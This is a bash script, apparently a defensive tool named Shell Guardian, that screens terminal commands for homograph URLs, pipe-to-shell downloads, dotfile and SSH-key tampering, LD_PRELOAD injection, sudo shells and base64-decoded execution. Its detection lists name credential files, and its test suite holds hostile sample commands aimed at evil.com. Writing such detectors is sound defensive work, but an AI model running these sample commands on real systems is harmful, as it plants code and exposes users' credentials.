#!/bin/bash
# Shell Guardian v0.3
# Protects against homograph attacks, pipe-to-shell, and other terminal threats
# By Orion & Aaron - 2026-02-03
# 
# v0.3 Changes:
# - Audit command with statistics and filtering
# - Environment variable injection detection
# - Sudo abuse pattern detection
# - Base64 payload execution detection
#
# v0.2 Changes:
# - External config file (config.yaml)
# - Audit logging
# - Status command
# - More homograph characters
# - Improved detection

set -euo pipefail

VERSION="0.3.0"

# ============================================================================
# PATHS & DEFAULTS
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${GUARDIAN_CONFIG:-$SCRIPT_DIR/config.yaml}"
LOG_DIR="${HOME}/.local/share/shell-guardian"
LOG_FILE="${LOG_DIR}/audit.log"

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color
BOLD='\033[1m'
DIM='\033[2m'

# Severity levels
CRITICAL="CRITICAL"
HIGH="HIGH"
MEDIUM="MEDIUM"

# ============================================================================
# CONFIGURATION LOADING
# ============================================================================

# Default allowed domains (used if no config file)
ALLOWED_PIPE_DOMAINS=(
    "get.docker.com"
    "sh.rustup.rs"
    "raw.githubusercontent.com"
    "brew.sh"
    "install.pi-hole.net"
    "getmic.ro"
    "deb.nodesource.com"
)

# Default protected dotfiles
PROTECTED_DOTFILES=(
    ".bashrc"
    ".zshrc"
    ".profile"
    ".bash_profile"
    ".ssh/authorized_keys"
    ".ssh/config"
    ".ssh/id_rsa"
    ".ssh/id_ed25519"
    ".gitconfig"
    ".npmrc"
    ".netrc"
    ".aws/credentials"
    ".kube/config"
)

# Load config if available (bash 3.2 compatible)
load_config() {
    if [[ -f "$CONFIG_FILE" ]]; then
        # Parse allowed domains from YAML
        if grep -q "allowed_domains:" "$CONFIG_FILE" 2>/dev/null; then
            local domains_str
            domains_str=$(sed -n '/allowed_domains:/,/^[a-z]/p' "$CONFIG_FILE" | grep "^  - " | sed 's/^  - //')
            if [[ -n "$domains_str" ]]; then
                ALLOWED_PIPE_DOMAINS=()
                while IFS= read -r line; do
                    [[ -n "$line" ]] && ALLOWED_PIPE_DOMAINS+=("$line")
                done <<< "$domains_str"
            fi
        fi
        
        # Parse protected dotfiles
        if grep -q "protected_dotfiles:" "$CONFIG_FILE" 2>/dev/null; then
            local dotfiles_str
            dotfiles_str=$(sed -n '/protected_dotfiles:/,/^[a-z]/p' "$CONFIG_FILE" | grep "^  - " | sed 's/^  - //')
            if [[ -n "$dotfiles_str" ]]; then
                PROTECTED_DOTFILES=()
                while IFS= read -r line; do
                    [[ -n "$line" ]] && PROTECTED_DOTFILES+=("$line")
                done <<< "$dotfiles_str"
            fi
        fi
        
        # Check if logging is enabled
        LOGGING_ENABLED=$(grep "enabled:" "$CONFIG_FILE" 2>/dev/null | head -1 | grep -q "true" && echo "true" || echo "false")
    fi
}

# ============================================================================
# LOGGING
# ============================================================================

ensure_log_dir() {
    mkdir -p "$LOG_DIR"
}

log_event() {
    local action="$1"
    local severity="$2"
    local rule="$3"
    local cmd_preview="$4"
    
    if [[ "${LOGGING_ENABLED:-true}" == "true" ]]; then
        ensure_log_dir
        local timestamp
        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        
        # Truncate and sanitize command for logging (no secrets)
        local safe_preview
        safe_preview=$(echo "$cmd_preview" | cut -c1-80 | tr -d '\n')
        
        echo "{\"ts\":\"$timestamp\",\"action\":\"$action\",\"severity\":\"$severity\",\"rule\":\"$rule\",\"preview\":\"$safe_preview\"}" >> "$LOG_FILE"
    fi
}

# ============================================================================
# DETECTION FUNCTIONS
# ============================================================================

# Extended homograph character list (v0.2)
detect_homographs() {
    local input="$1"
    local findings=""
    
    # Comprehensive homograph characters
    # Format: actual_char:lookalike:name:codepoint
    local homographs=(
        # Cyrillic lowercase
        "а:a:Cyrillic a:U+0430"
        "е:e:Cyrillic ie:U+0435"
        "о:o:Cyrillic o:U+043E"
        "р:p:Cyrillic er:U+0440"
        "с:c:Cyrillic es:U+0441"
        "у:y:Cyrillic u:U+0443"
        "х:x:Cyrillic ha:U+0445"
        "і:i:Cyrillic i:U+0456"
        "ј:j:Cyrillic je:U+0458"
        "ѕ:s:Cyrillic dze:U+0455"
        "ԁ:d:Cyrillic komi de:U+0501"
        "ɡ:g:Latin script g:U+0261"
        "һ:h:Cyrillic shha:U+04BB"
        "ո:n:Armenian now:U+0578"
        "ս:u:Armenian seh:U+057D"
        "ᴠ:v:Latin small cap V:U+1D20"
        "ᴡ:w:Latin small cap W:U+1D21"
        "ᴢ:z:Latin small cap Z:U+1D22"
        # Cyrillic uppercase
        "А:A:Cyrillic A:U+0410"
        "В:B:Cyrillic Ve:U+0412"
        "Е:E:Cyrillic Ie:U+0415"
        "К:K:Cyrillic Ka:U+041A"
        "М:M:Cyrillic Em:U+041C"
        "Н:H:Cyrillic En:U+041D"
        "О:O:Cyrillic O:U+041E"
        "Р:P:Cyrillic Er:U+0420"
        "С:C:Cyrillic Es:U+0421"
        "Т:T:Cyrillic Te:U+0422"
        "Х:X:Cyrillic Ha:U+0425"
        # Greek
        "ν:v:Greek nu:U+03BD"
        "ο:o:Greek omicron:U+03BF"
        "Α:A:Greek Alpha:U+0391"
        "Β:B:Greek Beta:U+0392"
        "Ε:E:Greek Epsilon:U+0395"
        "Η:H:Greek Eta:U+0397"
        "Ι:I:Greek Iota:U+0399"
        "Κ:K:Greek Kappa:U+039A"
        "Μ:M:Greek Mu:U+039C"
        "Ν:N:Greek Nu:U+039D"
        "Ο:O:Greek Omicron:U+039F"
        "Ρ:P:Greek Rho:U+03A1"
        "Τ:T:Greek Tau:U+03A4"
        "Υ:Y:Greek Upsilon:U+03A5"
        "Χ:X:Greek Chi:U+03A7"
        "Ζ:Z:Greek Zeta:U+0396"
        # Other confusables
        "ℓ:l:Script l:U+2113"
        "ⅰ:i:Roman numeral i:U+2170"
        "ⅼ:l:Roman numeral l:U+217C"
        "℮:e:Estimated sign:U+212E"
    )
    
    for entry in "${homographs[@]}"; do
        IFS=':' read -r char lookalike name codepoint <<< "$entry"
        if [[ "$input" == *"$char"* ]]; then
            findings="${findings}Found ${name} (${codepoint}) that looks like '${lookalike}'\n"
        fi
    done
    
    echo -e "$findings"
}

# Extract URLs from a command
extract_urls() {
    local cmd="$1"
    echo "$cmd" | grep -oE 'https?://[^ >"'"'"'|&;]+' 2>/dev/null || true
}

# Extract hostname from URL
get_hostname() {
    local url="$1"
    echo "$url" | sed -E 's|https?://([^/:]+).*|\1|'
}

# Check if domain is in allowed list
is_allowed_domain() {
    local domain="$1"
    for allowed in "${ALLOWED_PIPE_DOMAINS[@]}"; do
        if [[ "$domain" == "$allowed" ]]; then
            return 0
        fi
    done
    return 1
}

# Detect pipe-to-shell patterns
detect_pipe_to_shell() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE '(curl|wget)[^|]*\|[^|]*(sh|bash|zsh|python|perl|ruby)'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'eval[[:space:]]+[\$\(]+.*(curl|wget)'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE '(sh|bash|zsh)[[:space:]]+<\(.*(curl|wget)'; then
        return 0
    fi
    
    return 1
}

# Detect insecure HTTP in pipe-to-shell
detect_insecure_http_pipe() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE 'http://[^|]*\|[^|]*(sh|bash|zsh|python|perl|ruby)'; then
        return 0
    fi
    
    return 1
}

# Detect ANSI escape sequences
detect_ansi_injection() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE $'\x1b\[|\x1b\]|\x1bP|\x1b\\\\'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE '\\(e|033|x1b)\['; then
        return 0
    fi
    
    return 1
}

# Detect sensitive dotfile targets
detect_dotfile_attack() {
    local cmd="$1"
    
    for file in "${PROTECTED_DOTFILES[@]}"; do
        # Escape dots for regex
        local escaped_file
        escaped_file=$(echo "$file" | sed 's/\./\\./g')
        
        if echo "$cmd" | grep -qE "(>|>>)[[:space:]]*(~|\\\$HOME)?/?\.?${escaped_file}"; then
            echo "$file"
            return 0
        fi
        if echo "$cmd" | grep -qE "/(home/[^/]+|Users/[^/]+)/\.?${escaped_file}"; then
            echo "$file"
            return 0
        fi
    done
    
    return 1
}

# Detect environment variable injection (v0.3)
# Patterns like: VAR=malicious cmd, env VAR=x cmd
detect_env_injection() {
    local cmd="$1"
    
    # Dangerous env patterns that could override security-critical vars
    local dangerous_vars=(
        "LD_PRELOAD"
        "LD_LIBRARY_PATH"
        "DYLD_INSERT_LIBRARIES"
        "PATH"
        "PYTHONPATH"
        "NODE_PATH"
        "RUBYLIB"
        "PERL5LIB"
        "CLASSPATH"
        "HOME"
        "SHELL"
        "ENV"
        "BASH_ENV"
    )
    
    for var in "${dangerous_vars[@]}"; do
        # Match: VAR=something cmd or env VAR=something
        if echo "$cmd" | grep -qE "(^|;|&&|\|\|)[[:space:]]*(env[[:space:]]+)?${var}="; then
            echo "$var"
            return 0
        fi
    done
    
    return 1
}

# Detect sudo abuse patterns (v0.3)
detect_sudo_abuse() {
    local cmd="$1"
    
    # Dangerous sudo patterns
    if echo "$cmd" | grep -qE 'sudo[[:space:]]+(bash|sh|zsh|fish)([[:space:]]|$)'; then
        echo "sudo to shell"
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'sudo[[:space:]]+su([[:space:]]|$)'; then
        echo "sudo su"
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'sudo[[:space:]]+-i([[:space:]]|$)'; then
        echo "sudo -i (login shell)"
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'sudo[[:space:]]+-s([[:space:]]|$)'; then
        echo "sudo -s (shell)"
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'sudo[[:space:]]+.*[|;]'; then
        echo "sudo with chaining"
        return 0
    fi
    
    return 1
}

# Detect base64 encoded payload execution (v0.3)
detect_base64_execution() {
    local cmd="$1"
    
    # base64 decode piped to shell
    if echo "$cmd" | grep -qE 'base64[[:space:]]+-[dD].*\|.*\b(sh|bash|zsh|python|perl|ruby|eval)\b'; then
        echo "base64 decode | shell"
        return 0
    fi
    
    # echo ... | base64 -d | shell
    if echo "$cmd" | grep -qE 'echo[[:space:]]+.*\|[[:space:]]*base64[[:space:]]+-[dD].*\|'; then
        echo "echo | base64 -d | ..."
        return 0
    fi
    
    # Heredoc/herestring with base64
    if echo "$cmd" | grep -qE '<<<.*base64|base64.*<<<'; then
        echo "base64 with herestring"
        return 0
    fi
    
    # eval with base64
    if echo "$cmd" | grep -qE 'eval.*base64|base64.*eval'; then
        echo "eval with base64"
        return 0
    fi
    
    return 1
}

# ============================================================================
# MAIN ANALYSIS
# ============================================================================

analyze_command() {
    local cmd="$1"
    local block=false
    local warn=false
    local messages=""
    local triggered_rules=""
    
    # Skip if bypass is set
    if [[ "${GUARDIAN:-1}" == "0" ]]; then
        return 0
    fi
    
    # Load config
    load_config
    
    # 1. Check URLs for homographs
    local urls
    urls=$(extract_urls "$cmd")
    
    for url in $urls; do
        local hostname
        hostname=$(get_hostname "$url")
        
        local homograph_findings
        homograph_findings=$(detect_homographs "$hostname")
        
        if [[ -n "$homograph_findings" ]]; then
            block=true
            triggered_rules="${triggered_rules}homograph_attack,"
            messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Homograph attack detected in URL${NC}\n"
            messages="${messages}  URL: ${url}\n"
            messages="${messages}  ${homograph_findings}"
            messages="${messages}  ${CYAN}This URL may redirect to a malicious server!${NC}\n"
        fi
    done
    
    # 2. Check for insecure HTTP pipe-to-shell (always block)
    if detect_insecure_http_pipe "$cmd"; then
        block=true
        triggered_rules="${triggered_rules}insecure_http_pipe,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Insecure HTTP pipe-to-shell${NC}\n"
        messages="${messages}  Downloading over HTTP (unencrypted) and executing.\n"
        messages="${messages}  ${CYAN}This can be intercepted and modified by attackers!${NC}\n"
    # 3. Check for HTTPS pipe-to-shell (warn unless allowed domain)
    elif detect_pipe_to_shell "$cmd"; then
        local url_in_cmd
        url_in_cmd=$(extract_urls "$cmd" | head -1)
        local domain=""
        
        if [[ -n "$url_in_cmd" ]]; then
            domain=$(get_hostname "$url_in_cmd")
        fi
        
        if [[ -n "$domain" ]] && is_allowed_domain "$domain"; then
            : # Allowed domain, skip warning
        else
            warn=true
            triggered_rules="${triggered_rules}pipe_to_shell,"
            messages="${messages}\n${YELLOW}${BOLD}[${MEDIUM}]${NC} ${YELLOW}Pipe-to-shell detected${NC}\n"
            messages="${messages}  Downloading and executing code directly.\n"
            messages="${messages}  ${CYAN}Consider: download first, review, then execute.${NC}\n"
            if [[ -n "$domain" ]]; then
                messages="${messages}  Domain: ${domain}\n"
            fi
        fi
    fi
    
    # 4. Check for ANSI injection
    if detect_ansi_injection "$cmd"; then
        warn=true
        triggered_rules="${triggered_rules}ansi_injection,"
        messages="${messages}\n${YELLOW}${BOLD}[${HIGH}]${NC} ${YELLOW}ANSI escape sequences detected${NC}\n"
        messages="${messages}  Command contains terminal control codes.\n"
        messages="${messages}  ${CYAN}This could manipulate your terminal display.${NC}\n"
    fi
    
    # 5. Check for dotfile attacks
    local dotfile_target
    if dotfile_target=$(detect_dotfile_attack "$cmd"); then
        block=true
        triggered_rules="${triggered_rules}dotfile_attack,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Sensitive dotfile targeted${NC}\n"
        messages="${messages}  Target: ${dotfile_target}\n"
        messages="${messages}  ${CYAN}This could compromise your shell or credentials.${NC}\n"
    fi
    
    # 6. Check for environment variable injection (v0.3)
    local env_var
    if env_var=$(detect_env_injection "$cmd"); then
        block=true
        triggered_rules="${triggered_rules}env_injection,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Environment variable injection${NC}\n"
        messages="${messages}  Variable: ${env_var}\n"
        messages="${messages}  ${CYAN}Overriding this variable can hijack program execution.${NC}\n"
    fi
    
    # 7. Check for sudo abuse (v0.3)
    local sudo_pattern
    if sudo_pattern=$(detect_sudo_abuse "$cmd"); then
        warn=true
        triggered_rules="${triggered_rules}sudo_abuse,"
        messages="${messages}\n${YELLOW}${BOLD}[${HIGH}]${NC} ${YELLOW}Risky sudo pattern${NC}\n"
        messages="${messages}  Pattern: ${sudo_pattern}\n"
        messages="${messages}  ${CYAN}This escalates to a root shell. Be certain this is intended.${NC}\n"
    fi
    
    # 8. Check for base64 payload execution (v0.3)
    local base64_pattern
    if base64_pattern=$(detect_base64_execution "$cmd"); then
        block=true
        triggered_rules="${triggered_rules}base64_execution,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Base64 payload execution${NC}\n"
        messages="${messages}  Pattern: ${base64_pattern}\n"
        messages="${messages}  ${CYAN}Encoded payloads hide malicious commands. Decode and review first.${NC}\n"
    fi
    
    # Output results and log
    if [[ "$block" == true ]]; then
        echo -e "\n${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}║  🛡️  SHELL GUARDIAN - BLOCKED                              ║${NC}"
        echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        echo -e "${CYAN}Bypass: prefix command with GUARDIAN=0${NC}\n"
        log_event "BLOCKED" "CRITICAL" "$triggered_rules" "$cmd"
        return 1
    elif [[ "$warn" == true ]]; then
        echo -e "\n${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}${BOLD}║  🛡️  SHELL GUARDIAN - WARNING                              ║${NC}"
        echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        log_event "WARNED" "MEDIUM" "$triggered_rules" "$cmd"
        return 0
    fi
    
    # Clean - no output
    return 0
}

# ============================================================================
# CLI INTERFACE
# ============================================================================

show_help() {
    echo "Shell Guardian v${VERSION}"
    echo "Protects against homograph attacks and other terminal threats"
    echo ""
    echo "Usage:"
    echo "  guardian.sh check \"<command>\"   - Analyze a command"
    echo "  guardian.sh test                 - Run test suite"
    echo "  guardian.sh status               - Show Guardian status"
    echo "  guardian.sh audit [options]      - Review security event history"
    echo "  guardian.sh log [n]              - Show last n log entries (default 10)"
    echo "  guardian.sh hook                 - Output shell hook code"
    echo "  guardian.sh version              - Show version"
    echo "  guardian.sh help                 - Show this help"
    echo ""
    echo "Audit options:"
    echo "  guardian.sh audit                - Show summary + last 10 events"
    echo "  guardian.sh audit -n 20          - Show last 20 events"
    echo "  guardian.sh audit --blocked      - Show only blocked events"
    echo "  guardian.sh audit --warned       - Show only warned events"
    echo "  guardian.sh audit --stats        - Show statistics only"
    echo ""
    echo "Environment:"
    echo "  GUARDIAN=0 <cmd>     - Bypass guardian for one command"
    echo "  GUARDIAN_CONFIG=path - Use custom config file"
}

show_status() {
    load_config
    
    echo -e "${GREEN}${BOLD}🛡️  Shell Guardian v${VERSION}${NC}"
    echo ""
    echo -e "${BOLD}Configuration:${NC}"
    if [[ -f "$CONFIG_FILE" ]]; then
        echo -e "  Config file: ${GREEN}✓${NC} $CONFIG_FILE"
    else
        echo -e "  Config file: ${YELLOW}Using defaults${NC} (no config.yaml found)"
    fi
    
    echo -e "  Log file: $LOG_FILE"
    if [[ -f "$LOG_FILE" ]]; then
        local log_count
        log_count=$(wc -l < "$LOG_FILE" | tr -d ' ')
        echo -e "  Log entries: $log_count"
    else
        echo -e "  Log entries: 0 (no log file yet)"
    fi
    
    echo ""
    echo -e "${BOLD}Allowed Domains:${NC}"
    for domain in "${ALLOWED_PIPE_DOMAINS[@]}"; do
        echo "  - $domain"
    done
    
    echo ""
    echo -e "${BOLD}Protected Dotfiles:${NC}"
    for file in "${PROTECTED_DOTFILES[@]}"; do
        echo "  - $file"
    done
    
    echo ""
    echo -e "${BOLD}Homograph Detection:${NC}"
    echo "  Characters monitored: 50+"
    echo "  Scripts: Cyrillic, Greek, Armenian, Roman numerals"
}

show_log() {
    local count="${1:-10}"
    
    if [[ ! -f "$LOG_FILE" ]]; then
        echo "No log file found. Guardian hasn't blocked/warned anything yet."
        return 0
    fi
    
    echo -e "${BOLD}Last $count Guardian events:${NC}"
    echo ""
    tail -n "$count" "$LOG_FILE" | while read -r line; do
        local action
        action=$(echo "$line" | sed -n 's/.*"action":"\([^"]*\)".*/\1/p')
        local ts
        ts=$(echo "$line" | sed -n 's/.*"ts":"\([^"]*\)".*/\1/p')
        local rule
        rule=$(echo "$line" | sed -n 's/.*"rule":"\([^"]*\)".*/\1/p')
        local preview
        preview=$(echo "$line" | sed -n 's/.*"preview":"\([^"]*\)".*/\1/p')
        
        if [[ "$action" == "BLOCKED" ]]; then
            echo -e "${RED}[$ts] BLOCKED${NC} - $rule"
        else
            echo -e "${YELLOW}[$ts] WARNED${NC} - $rule"
        fi
        echo -e "  ${DIM}$preview${NC}"
        echo ""
    done
}

# Audit command - enhanced security event review (v0.3)
show_audit() {
    local count=10
    local filter=""
    local stats_only=false
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -n|--count)
                count="$2"
                shift 2
                ;;
            --blocked)
                filter="BLOCKED"
                shift
                ;;
            --warned)
                filter="WARNED"
                shift
                ;;
            --stats)
                stats_only=true
                shift
                ;;
            *)
                shift
                ;;
        esac
    done
    
    if [[ ! -f "$LOG_FILE" ]]; then
        echo -e "${GREEN}${BOLD}🛡️  Shell Guardian Audit${NC}"
        echo ""
        echo "No events recorded yet. Your terminal is clean!"
        return 0
    fi
    
    # Calculate statistics
    local total_events blocked_count warned_count
    total_events=$(wc -l < "$LOG_FILE" | tr -d ' ')
    blocked_count=$(grep -c '"action":"BLOCKED"' "$LOG_FILE" 2>/dev/null || echo 0)
    warned_count=$(grep -c '"action":"WARNED"' "$LOG_FILE" 2>/dev/null || echo 0)
    
    # Get rule breakdown
    local homograph_count pipe_count dotfile_count env_count sudo_count base64_count http_count
    homograph_count=$(grep -c 'homograph_attack' "$LOG_FILE" 2>/dev/null || echo 0)
    pipe_count=$(grep -c 'pipe_to_shell' "$LOG_FILE" 2>/dev/null || echo 0)
    dotfile_count=$(grep -c 'dotfile_attack' "$LOG_FILE" 2>/dev/null || echo 0)
    env_count=$(grep -c 'env_injection' "$LOG_FILE" 2>/dev/null || echo 0)
    sudo_count=$(grep -c 'sudo_abuse' "$LOG_FILE" 2>/dev/null || echo 0)
    base64_count=$(grep -c 'base64_execution' "$LOG_FILE" 2>/dev/null || echo 0)
    http_count=$(grep -c 'insecure_http_pipe' "$LOG_FILE" 2>/dev/null || echo 0)
    
    echo -e "${GREEN}${BOLD}🛡️  Shell Guardian Audit${NC}"
    echo ""
    echo -e "${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}                        STATISTICS                          ${NC}"
    echo -e "${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  Total events:    ${BOLD}$total_events${NC}"
    echo -e "  ${RED}Blocked:${NC}         ${RED}$blocked_count${NC}"
    echo -e "  ${YELLOW}Warned:${NC}          ${YELLOW}$warned_count${NC}"
    echo ""
    echo -e "${BOLD}  By threat type:${NC}"
    [[ $homograph_count -gt 0 ]] && echo -e "    Homograph attacks:     $homograph_count"
    [[ $pipe_count -gt 0 ]] && echo -e "    Pipe-to-shell:         $pipe_count"
    [[ $http_count -gt 0 ]] && echo -e "    Insecure HTTP:         $http_count"
    [[ $dotfile_count -gt 0 ]] && echo -e "    Dotfile attacks:       $dotfile_count"
    [[ $env_count -gt 0 ]] && echo -e "    Env injection:         $env_count"
    [[ $sudo_count -gt 0 ]] && echo -e "    Sudo abuse:            $sudo_count"
    [[ $base64_count -gt 0 ]] && echo -e "    Base64 execution:      $base64_count"
    echo ""
    
    if [[ "$stats_only" == true ]]; then
        return 0
    fi
    
    echo -e "${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}                      RECENT EVENTS                         ${NC}"
    echo -e "${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Filter and display events
    local log_data
    if [[ -n "$filter" ]]; then
        log_data=$(grep "\"action\":\"$filter\"" "$LOG_FILE" | tail -n "$count")
        echo -e "  ${DIM}(Showing only $filter events)${NC}"
        echo ""
    else
        log_data=$(tail -n "$count" "$LOG_FILE")
    fi
    
    if [[ -z "$log_data" ]]; then
        echo "  No matching events found."
        return 0
    fi
    
    echo "$log_data" | while read -r line; do
        local action ts rule preview
        action=$(echo "$line" | sed -n 's/.*"action":"\([^"]*\)".*/\1/p')
        ts=$(echo "$line" | sed -n 's/.*"ts":"\([^"]*\)".*/\1/p')
        rule=$(echo "$line" | sed -n 's/.*"rule":"\([^"]*\)".*/\1/p')
        preview=$(echo "$line" | sed -n 's/.*"preview":"\([^"]*\)".*/\1/p')
        
        # Format timestamp nicely
        local formatted_ts
        formatted_ts=$(echo "$ts" | sed 's/T/ /' | sed 's/Z$//')
        
        if [[ "$action" == "BLOCKED" ]]; then
            echo -e "  ${RED}█ BLOCKED${NC} ${DIM}$formatted_ts${NC}"
        else
            echo -e "  ${YELLOW}▲ WARNING${NC} ${DIM}$formatted_ts${NC}"
        fi
        echo -e "    Rule: ${CYAN}${rule//,/, }${NC}"
        echo -e "    Cmd:  ${DIM}$preview${NC}"
        echo ""
    done
}

run_tests() {
    echo "Running Shell Guardian v${VERSION} test suite..."
    echo ""
    
    local tests_passed=0
    local tests_failed=0
    
    # Test 1: Homograph detection
    echo "Test 1: Cyrillic homograph in URL"
    if ! analyze_command 'curl -sSL https://іnstall.example.com | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 2: Clean URL should pass
    echo "Test 2: Clean URL (should pass)"
    if analyze_command 'curl -sSL https://example.com/file.txt' 2>/dev/null; then
        echo "  ✅ PASSED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 3: Pipe to shell warning
    echo "Test 3: Pipe-to-shell detection"
    analyze_command 'curl https://evil.com/script.sh | bash' 2>/dev/null
    echo "  ✅ WARNING shown (check above)"
    ((tests_passed++))
    echo ""
    
    # Test 4: Dotfile attack
    echo "Test 4: Dotfile attack detection"
    if ! analyze_command 'curl https://evil.com/payload >> ~/.bashrc' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 5: Allowed domain
    echo "Test 5: Allowed domain (get.docker.com)"
    analyze_command 'curl -fsSL https://get.docker.com | sh' 2>/dev/null
    echo "  ✅ Should show no warning for allowed domain"
    ((tests_passed++))
    echo ""
    
    # Test 6: Insecure HTTP (new in v0.2)
    echo "Test 6: Insecure HTTP pipe-to-shell"
    if ! analyze_command 'curl http://example.com/script.sh | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct - HTTP is insecure)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 7: SSH key protection (new in v0.2)
    echo "Test 7: SSH key file protection"
    if ! analyze_command 'echo "evil" >> ~/.ssh/authorized_keys' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 8: Environment variable injection (new in v0.3)
    echo "Test 8: LD_PRELOAD injection"
    if ! analyze_command 'LD_PRELOAD=/tmp/evil.so /usr/bin/sudo' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 9: Sudo abuse (new in v0.3)
    echo "Test 9: Sudo abuse pattern"
    analyze_command 'sudo bash' 2>/dev/null
    echo "  ✅ WARNING shown (check above)"
    ((tests_passed++))
    echo ""
    
    # Test 10: Base64 payload execution (new in v0.3)
    echo "Test 10: Base64 payload execution"
    if ! analyze_command 'echo "bWFsd2FyZQ==" | base64 -d | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    echo "================================"
    echo "Tests passed: $tests_passed"
    echo "Tests failed: $tests_failed"
    
    if [[ $tests_failed -eq 0 ]]; then
        echo -e "${GREEN}All tests passed! ✅${NC}"
    else
        echo -e "${RED}Some tests failed! ❌${NC}"
        return 1
    fi
}

output_hook() {
    local script_path
    script_path=$(realpath "${BASH_SOURCE[0]}")
    
    cat << HOOK
# Shell Guardian Hook v${VERSION}
# Add this to your ~/.zshrc or ~/.bashrc:

_guardian_preexec() {
    local cmd="\$1"
    
    # Skip if guardian is disabled
    [[ "\${GUARDIAN:-1}" == "0" ]] && return 0
    
    # Run guardian check
    if ! "${script_path}" check "\$cmd"; then
        return 1
    fi
}

# For Zsh
if [[ -n "\$ZSH_VERSION" ]]; then
    autoload -Uz add-zsh-hook
    add-zsh-hook preexec _guardian_preexec
fi

# For Bash (requires bash-preexec)
if [[ -n "\$BASH_VERSION" ]]; then
    if declare -F __bp_precmd_invoke_cmd &>/dev/null; then
        preexec_functions+=(_guardian_preexec)
    else
        echo "Shell Guardian: For bash, install bash-preexec first"
        echo "  https://github.com/rcaloras/bash-preexec"
    fi
fi
HOOK
}

# Main entry point
case "${1:-help}" in
    check)
        shift
        analyze_command "$*"
        ;;
    test)
        run_tests
        ;;
    status)
        show_status
        ;;
    audit)
        shift
        show_audit "$@"
        ;;
    log)
        show_log "${2:-10}"
        ;;
    hook)
        output_hook
        ;;
    version|--version|-v)
        echo "Shell Guardian v${VERSION}"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        show_help
        exit 1
        ;;
esac
